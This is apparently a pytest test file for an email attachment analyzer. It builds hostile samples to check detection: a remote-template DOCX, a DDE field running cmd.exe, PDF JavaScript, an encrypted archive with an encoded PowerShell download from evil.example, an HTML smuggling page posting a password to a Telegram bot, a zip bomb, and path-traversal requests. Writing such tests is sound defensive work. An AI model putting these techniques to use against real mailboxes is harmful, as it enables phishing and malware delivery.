import io
import json
import shutil
import sys
import zipfile
from datetime import datetime
from email.message import EmailMessage
from uuid import uuid4

import pytest

from assessment_helpers import ROOT
from conftest import logged_in

sys.path.insert(0, str(ROOT / 'mailbox'))
import qbmail  # noqa: E402
import attachments  # noqa: E402

RULES = attachments.load_rules([str(ROOT / 'rules')])


def message_with(*files, body='See the attached document.'):
    message = EmailMessage()
    message['From'] = 'billing@example.com'
    message['To'] = 'victim@example.org'
    message['Subject'] = 'Invoice'
    message.set_content(body)
    for name, data, maintype, subtype in files:
        message.add_attachment(data, maintype=maintype, subtype=subtype, filename=name)
    return bytes(message)


def analyze(raw):
    extras = {}
    analysis, _ = qbmail.analyze(raw, 'm.eml', extras=extras, rules=RULES)
    return analysis, extras


def ids(analysis):
    return {item['id'] for item in analysis['indicators']}


def docx(document_xml, rels=None):
    output = io.BytesIO()
    with zipfile.ZipFile(output, 'w') as archive:
        archive.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                         '<Default Extension="xml" ContentType="application/xml"/>'
                         '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
        archive.writestr('_rels/.rels', '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                         '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
        archive.writestr('word/document.xml', document_xml)
        if rels:
            archive.writestr('word/_rels/settings.xml.rels', rels)
    return output.getvalue()


WORD_NS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'


def test_remote_template_injection_is_found_and_its_url_listed():
    rels = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    document = '<w:document {}><w:body><w:p><w:r><w:t>hi</w:t></w:r></w:p></w:body></w:document>'.format(WORD_NS)
    analysis, _ = analyze(message_with(('offer.docx', docx(document, rels), 'application', 'octet-stream')))
    assert 'remote_template' in ids(analysis)
    link = next(item for item in analysis['links'] if item['target'] == 'https://evil.example/t.dotm')
    assert link['sources'] == ['attachment'] and link['origin'].startswith('offer.docx')


def test_dde_field_is_found():
    document = ('<w:document {}><w:body><w:p><w:fldSimple w:instr=\'DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"\'>'
                '<w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:body></w:document>').format(WORD_NS)
    analysis, _ = analyze(message_with(('dde.docx', docx(document), 'application', 'octet-stream')))
    assert 'dde_field' in ids(analysis)


def pdf_with_javascript_and_link():
    pypdf = pytest.importorskip('pypdf')
    from pypdf.annotations import Link
    writer = pypdf.PdfWriter()
    writer.add_blank_page(width=300, height=300)
    writer.add_annotation(0, Link(rect=(10, 10, 200, 60), url='https://evil.example/pdf-login'))
    writer.add_js('app.alert("x");')
    output = io.BytesIO()
    writer.write(output)
    return output.getvalue()


def test_pdf_javascript_links_and_preview():
    analysis, _ = analyze(message_with(('invoice.pdf', pdf_with_javascript_and_link(), 'application', 'pdf')))
    assert 'pdf_javascript' in ids(analysis)
    assert any(item['target'] == 'https://evil.example/pdf-login' for item in analysis['links'])
    inspected = analysis['attachments'][0]['analysis']
    assert inspected['pdf']['keywords']['/JavaScript'] >= 1
    if shutil.which('pdftoppm'):
        assert inspected['preview'].startswith('data:image/png;base64,')


def test_encrypted_archive_opened_with_password_from_body_and_inspected_recursively():
    pyzipper = pytest.importorskip('pyzipper')
    if not attachments.sevenzip():
        pytest.skip('7-Zip is needed to open AES archives')
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, 'w') as archive:
        archive.writestr('run.bat', 'powershell -nop -w hidden -enc ' +
                         __import__('base64').b64encode('iwr https://evil.example/p.ps1'.encode('utf-16-le')).decode())
    outer = io.BytesIO()
    with pyzipper.AESZipFile(outer, 'w', encryption=pyzipper.WZ_AES) as archive:
        archive.setpassword(b'Fx7321')
        archive.writestr('documents.zip', inner.getvalue())
    analysis, extras = analyze(message_with(('docs.zip', outer.getvalue(), 'application', 'zip'),
                                            body='The password is: Fx7321'))
    found = ids(analysis)
    assert {'archive_password_in_body', 'script_command'} <= found
    top = analysis['attachments'][0]['analysis']
    assert top['archive']['password'] == 'Fx7321'
    nested = top['children'][0]['analysis']['children'][0]
    assert nested['filename'] == 'run.bat'
    assert any(item['target'] == 'https://evil.example/p.ps1' for item in analysis['links'])
    assert nested['sha256'] in analysis['iocs']['sha256'] and nested['sha256'] in extras['samples']


def test_zip_bomb_is_not_extracted():
    output = io.BytesIO()
    with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as archive:
        archive.writestr('zeros.bin', b'\0' * (attachments.MAX_TOTAL_BYTES + 1))
    analysis, _ = analyze(message_with(('big.zip', output.getvalue(), 'application', 'zip')))
    assert 'archive_bomb' in ids(analysis)
    assert analysis['attachments'][0]['analysis']['children'] == []


SMUGGLING = b'''<html><body><form action="https://api.telegram.org/bot123/sendMessage"><input type="password" name="p"></form>
<script>var d=atob("TVqQAAMAAAAEAAAA");var b=new Blob([d]);var a=document.createElement("a");
a.href=URL.createObjectURL(b);a.download="invoice.iso";a.click();</script>
<a href="https://evil.example/next">continue</a></body></html>'''


def test_html_attachment_smuggling_phishing_page_rendered_inert_and_yara():
    analysis, extras = analyze(message_with(('invoice.html', SMUGGLING, 'text', 'html')))
    found = ids(analysis)
    assert {'html_smuggling', 'local_phishing_page', 'yara_match'} <= found
    record = analysis['attachments'][0]
    assert record['analysis']['rendered'] is True
    rendered = extras['rendered'][record['sha256']]
    assert '<script' not in rendered and 'telegram' not in rendered
    link = next(item for item in analysis['links'] if item['target'] == 'https://evil.example/next')
    assert 'data-up-link="{}"'.format(link['id']) in rendered  # clickable through the same inspector
    assert {m['rule'] for m in record['analysis']['yara']} >= {'UrlProbe_HTML_Smuggling', 'UrlProbe_Telegram_Exfiltration'}


def test_qr_code_in_inline_image_becomes_a_link():
    pytest.importorskip('qrcode')
    try:
        from pyzbar import pyzbar  # noqa: F401
    except Exception:
        pytest.skip('zbar is not installed')
    import qrcode
    image = io.BytesIO()
    qrcode.make('https://evil.example/qr-login').save(image, format='PNG')
    analysis, _ = analyze(message_with(('scan.png', image.getvalue(), 'image', 'png')))
    assert 'qr_code_url' in ids(analysis)
    link = next(item for item in analysis['links'] if item['target'] == 'https://evil.example/qr-login')
    assert link['sources'] == ['qr']


def test_yara_rules_compile_and_match_eicar():
    assert RULES, 'the example rules must compile'
    eicar = rb'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    analysis, _ = analyze(message_with(('eicar.com.txt', eicar, 'text', 'plain')))
    assert 'yara_match' in ids(analysis)


def test_password_extraction_from_text():
    assert attachments.passwords_in('Il file è protetto. Password: Ab12cd\nGrazie') == ['Ab12cd']
    assert 'zip2026' in attachments.passwords_in('pwd = zip2026')


def test_entry_point_writes_encrypted_samples_and_renderings(tmp_path):
    pyzipper = pytest.importorskip('pyzipper')
    import runpy
    run = runpy.run_path(str(ROOT / 'mailbox/run.py'), run_name='mailbox_run')
    main = run['main']
    (tmp_path / 'in').mkdir()
    (tmp_path / 'out').mkdir()
    (tmp_path / 'in' / 'input.eml').write_bytes(message_with(('invoice.html', SMUGGLING, 'text', 'html')))
    main.__globals__.update(INPUT_DIR=str(tmp_path / 'in'), OUTPUT_DIR=str(tmp_path / 'out'),
                            RULES_DIRS=[str(ROOT / 'rules')])
    assert main(['input.eml']) == 0
    analysis = json.loads((tmp_path / 'out' / 'email.json').read_text())
    digest = analysis['attachments'][0]['sha256']
    assert digest in analysis['samples'] and analysis['yara_rules'] >= 1
    assert (tmp_path / 'out' / 'rendered' / (digest + '.html')).exists()
    with pyzipper.AESZipFile(tmp_path / 'out' / 'samples' / (digest + '.zip')) as archive:
        with pytest.raises(RuntimeError):
            archive.read('invoice.html')  # encrypted: no password, no content
        archive.setpassword(b'infected')
        assert archive.read('invoice.html') == SMUGGLING
    with pyzipper.AESZipFile(tmp_path / 'out' / 'samples' / 'all.zip') as archive:
        archive.setpassword(b'infected')
        assert archive.read(digest[:8] + '_invoice.html') == SMUGGLING


def test_web_serves_samples_and_inert_renderings_to_the_owner_only(env, tmp_path):
    web, db, alice, bob, _ = env
    task = str(uuid4())
    db.taskdblogs.insert_one({'task': task, 'owner_id': str(alice.id), 'type': 'email', 'status': 'completed',
                              'start': datetime.utcnow(), 'end': datetime.utcnow(), 'logs': []})
    digest = 'a' * 64
    (tmp_path / task / 'mail' / 'samples').mkdir(parents=True)
    (tmp_path / task / 'mail' / 'rendered').mkdir()
    (tmp_path / task / 'mail' / 'samples' / (digest + '.zip')).write_bytes(b'PK zip')
    (tmp_path / task / 'mail' / 'samples' / 'all.zip').write_bytes(b'PK all')
    (tmp_path / task / 'mail' / 'rendered' / (digest + '.html')).write_text('<p>inert</p>')
    client = logged_in(web, alice)
    sample = client.get(f'/report/{task}/samples/{digest}.zip')
    assert sample.status_code == 200 and sample.mimetype == 'application/zip'
    assert 'attachment' in sample.headers['Content-Disposition']
    assert client.get(f'/report/{task}/samples/all.zip').data == b'PK all'
    rendered = client.get(f'/report/{task}/rendered/{digest}')
    assert rendered.status_code == 200 and "script-src 'none'" in rendered.headers['Content-Security-Policy']
    for bad in ('../../etc/passwd', 'all', 'A' * 64, digest[:63]):
        assert client.get(f'/report/{task}/rendered/{bad}').status_code == 404
    assert client.get(f'/report/{task}/samples/..%2F..%2Fx.zip').status_code == 404
    assert logged_in(web, bob).get(f'/report/{task}/samples/{digest}.zip').status_code == 404


def test_pdf_literal_strings_are_decoded():
    assert attachments.pdf_string(rb'https\072\057\057evil\056example\057x') == 'https://evil.example/x'
    assert attachments.pdf_string(rb'a\(b\)\\c') == 'a(b)\\c'
